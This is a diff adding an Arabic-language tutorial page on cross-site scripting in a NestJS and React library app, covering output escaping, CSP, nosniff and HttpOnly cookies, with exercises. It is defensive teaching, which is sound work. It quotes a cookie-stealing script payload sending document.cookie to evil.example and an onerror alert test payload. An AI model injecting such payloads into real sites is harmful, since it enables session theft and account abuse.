@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>XSS</title>
+<link rel="stylesheet" href="../../assets/learn.css" />
+</head>
+<body class="learn-page" data-learn="lesson" data-md="05-xss.md">
+<div id="learn-root"></div>
+<main>
+<article>
+<h1>XSS</h1>
+<h2>الهدف من هذا الدرس</h2>
+<p>فهم حقن سكربت في صفحة تعرض محتوى المستخدم، وما الذي يحدّه في واجهة المكتبة مع API يرجع JSON.</p>
+<h2>المشكلة التي يحلها</h2>
+<p>Ada تكتب عنوان مقال <code>&lt;script&gt;fetch(&#39;https://evil.example?c=&#39;+document.cookie)&lt;/script&gt;</code>. إن وضعت الواجهة العنوان داخل HTML خام، المتصفح ينفّذ السكربت في أصل المكتبة. الكعكة <code>HttpOnly</code> لا تُقرأ من <code>document.cookie</code>، لكن السكربت يستطيع إرسال طلبات بنفس الأصل، وتعديل الصفحة، وقراءة رمز إن كان في <code>localStorage</code>.</p>
+<h2>الفكرة ببساطة</h2>
+<p>XSS تنفيذ كود المهاجم داخل أصل الضحية. المصدر بيانات تُعرض كـ HTML. الدفاع في العرض: تهريب النص، و <code>Content-Type</code> الصحيح، و CSP التي تحد مصادر السكربت. API الذي يرجع JSON لا ينفّذ HTML بنفسه. الخطر يظهر حين يلصق العميل الحقل في DOM بلا تهريب.</p>
+<h2>التعريف التقني</h2>
+<p>لا حزمة Nest اسمها «فلتر XSS». الحماية موزعة:</p>
+<ul>
+<li>الاستجابة <code>Content-Type: application/json</code>. الرأس <code>X-Content-Type-Options: nosniff</code> من <code>useSecurityHeaders</code> يمنع المتصفح من تخمين النوع وتنفيذ ملف.</li>
+<li><code>Content-Security-Policy</code> الافتراضي يقصر <code>script-src</code> على <code>&#39;self&#39;</code>. سكربت من <code>evil.example</code> لا يُحمَّل. السكربت المضمّن ما زال يعتمد على بقية السياسة، لذلك لا تفتح <code>&#39;unsafe-inline&#39;</code> في <code>script-src</code> للإنتاج.</li>
+<li>كعكة <code>__Host-sid</code> بصفة <code>HttpOnly</code> لا تظهر في <code>document.cookie</code>.</li>
+<li>الواجهة تعرض العنوان كنص. في React النص في <code>{post.title}</code> يُهرَّب. <code>dangerouslySetInnerHTML</code> يعرض HTML كما هو.</li>
+</ul>
+<p>التحقق بـ <code>class-validator</code> يرفض شكلًا خاطئًا ولا يحوّل <code>&lt;</code> إلى <code>&amp;lt;</code>. التهريب عند الإخراج في الصفحة، أو عند توليد HTML على الخادم إن فعلت ذلك.</p>
+<h2>Mental Model</h2>
+<pre><code class="language-text">عنوان فيه وسم
+  JSON يمر كما هو
+  الواجهة كنص -&gt; وسم ظاهر لا سكربت
+  الواجهة innerHTML -&gt; سكربت على أصل المكتبة
+  CSP تحد من أين يُحمَّل السكربت
+</code></pre>
+<h2>أبسط مثال</h2>
+<pre><code class="language-tsx">export function PostTitle({ title }: { title: string }) {
+  return &lt;h1&gt;{title}&lt;/h1&gt;;
+}
+</code></pre>
+<h2>شرح المثال</h2>
+<p>React يهرّب <code>&lt;</code> في النص. الزائر يرى الوسوم حروفًا. الاستبدال بـ <code>dangerouslySetInnerHTML={{ __html: title }}</code> ينفّذ ما في العنوان. إن احتجت تنسيقًا، خزّن تنسيقًا محدودًا تعرفه أنت وحوّله إلى وسوم سمّيتها، ولا تمرّر HTML المؤلف إلى DOM.</p>
+<p>على الخادم أبقِ <code>title</code> سلسلة في Prisma. لا تبنِ صفحة HTML بلصق العنوان داخل قالب نصي.</p>
+<h2>ماذا يحدث داخليًا؟</h2>
+<p>المتصفح يحلّل HTML ثم يشغّل السكربت في أصل الصفحة. الطلبات إلى API نفسه تُرفق معها كعكة الجلسة حسب صفاتها. لذلك XSS على أصل المكتبة يقدر أن ينشر مقالًا باسم الضحية حتى مع <code>HttpOnly</code>. CSRF يمنع أصلًا آخر. XSS نفس الأصل.</p>
+<p><code>localStorage</code> يقرأه أي سكربت على الأصل. لذلك رمز الدخول للواجهة لا يُحفظ هناك. الجوال الذي يخزّن التحديث خارج JavaScript الصفحة مسار مختلف، سبق في فصل الكعكات.</p>
+<p>رابط <code>javascript:</code> في حقل يُعرض كـ <code>href</code> شكل آخر. اقبل <code>https</code> فقط إن كان الحقل عنوانًا.</p>
+<h2>مثال عملي</h2>
+<p>اختبار واجهة: عنوان المقال <code>&lt;img src=x onerror=alert(1)&gt;</code>. الصفحة التي تستخدم <code>{post.title}</code> لا تنبّه. الصفحة التي تستخدم HTML خام تنبّه. افحص أيضًا أن استجابة <code>GET /posts/1</code> تبدأ بـ <code>application/json</code> وأن رأس CSP موجود بعد <code>useSecurityHeaders</code>. لا تحذف CSP لأن اختبارًا واحدًا احتاج سكربتًا خارجيًا. أضف المصدر المحدد.</p>
+<h2>أخطاء شائعة</h2>
+<ul>
+<li>«API يرجع JSON إذن XSS مستحيل». العميل قد يعرض الحقل HTML.</li>
+<li>وضع <code>accessToken</code> في <code>localStorage</code> لأن الكعكة <code>HttpOnly</code>.</li>
+<li><code>&#39;unsafe-inline&#39;</code> في <code>script-src</code> لتمرير واجهة.</li>
+<li>تهريب مرة عند الحفظ ثم عرض مزدوج يظهر <code>&amp;amp;lt;</code> أو يُفك لاحقًا في سياق HTML.</li>
+<li>ظن أن <code>IsString</code> يزيل الوسوم.</li>
+</ul>
+<h2>متى نستخدمه؟</h2>
+<p>تهريب المخرجات و CSP كلما عُرض نص المستخدم في متصفح، حتى لو كان المصدر API.</p>
+<h2>متى لا نستخدمه؟</h2>
+<p>كبديل عن المصادقة. صفحة نظيفة ما زالت تقبل <code>POST</code> بلا هوية إن كان المسار عامًا. وكبديل عن فحص CSRF من أصل آخر.</p>
+<h2>مقارنة</h2>
+<table>
+<thead>
+<tr>
+<th>عرض كنص</th>
+<th>عرض HTML خام</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>الوسوم حروف</td>
+<td>المتصفح ينفّذ</td>
+</tr>
+<tr>
+<td>مناسب لعنوان مقال</td>
+<td>مناسب لتنسيق أنت بنيته</td>
+</tr>
+<tr>
+<td>CSP طبقة إضافية</td>
+<td>سكربت مضمّن قد يمر إن ضعفت السياسة</td>
+</tr>
+</tbody></table>
+<h2>تمارين</h2>
+<h3>تمرين سهل</h3>
+<p>هل يرجع Nest خطأً لأن العنوان فيه <code>&lt;script&gt;</code>؟</p>
+<details>
+<summary>الحل</summary>
+
+<p>لا، إن كان الحقل سلسلة مقبولة. الخطر عند عرضها HTML. JSON ينقل النص.</p>
+</details>
+
+<h3>تمرين متوسط</h3>
+<p>لماذا تبقى كعكة <code>HttpOnly</code> غير كافية وحدها ضد XSS على نفس الأصل؟</p>
+<details>
+<summary>الحل</summary>
+
+<p>السكربت لا يقرأها، لكنه يرسل طلبات بنفس الأصل فيرفقها المتصفح، فيقدر أن يغيّر بيانات الضحية.</p>
+</details>
+
+<h3>تمرين متقدم</h3>
+<p>محرر غني يحفظ HTML المقال. ماذا تقبل في التخزين؟</p>
+<details>
+<summary>الحل</summary>
+
+<p>قائمة وسوم وصفات سمّيتها بعد تنظيف صارم، أو تنسيقًا غير HTML تحوّله أنت. لا تمرّر HTML الزائر إلى <code>innerHTML</code> ولا تفتح <code>&#39;unsafe-inline&#39;</code> لتعويض التنظيف.</p>
+</details>
+
+<h2>أسئلة مراجعة</h2>
+<ul>
+<li>أين يُهرَّب عنوان المقال؟</li>
+<li>ماذا يسرق XSS من <code>localStorage</code>؟</li>
+<li>أي رأس يحد مصدر السكربت؟</li>
+</ul>
+<h2>الخلاصة</h2>
+<p>XSS تشغيل كود في أصلك عبر عرض غير مهرَّب. أعد النص نصًا، أبقِ CSP ضيقة، وأبقِ جلسة المتصفح في كعكة لا يقرأها السكربت.</p>
+<h2>ماذا بعد؟</h2>
+<p><a href="./06-sql-injection.html">SQL Injection</a> حين يُلصق النص في الاستعلام.</p>
+<h2>المصادر الرسمية</h2>
+<ul>
+<li>NestJS — Security headers: <a href="https://docs.nestjs.com/security/helmet">https://docs.nestjs.com/security/helmet</a></li>
+<li>NestJS — Authentication: <a href="https://docs.nestjs.com/security/authentication">https://docs.nestjs.com/security/authentication</a></li>
+</ul>
+
+</article>
+</main>
+<script src="../../assets/learn.js"></script>
+</body>
+</html>
